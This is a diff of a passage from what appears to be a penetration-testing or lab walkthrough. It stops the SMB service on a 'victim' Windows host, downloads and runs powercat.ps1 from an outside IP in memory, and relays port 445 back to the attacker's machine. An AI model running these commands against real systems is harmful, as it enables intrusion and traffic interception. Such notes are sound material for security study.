@@ -159,10 +159,10 @@ Now, we will need to disable the SMB port on the victim:
 
 *Note: Run one by one in CMD, no powershell!)*
 
-    1. sc config LanmanServer start= disabled
-    2. sc stop LanmanServer
-    3. sc stop srv2
-    4. sc stop srvnet
+    sc config LanmanServer start= disabled
+    sc stop LanmanServer
+    sc stop srv2
+    sc stop srvnet
 
 Next, we will invoke powercat.ps1: `iex(iwr http://192.168.45.223/powercat.ps1 -useb)` and run:
 - `powercat -l -p 445 -r tcp:<PARROT IP>:445 -rep`
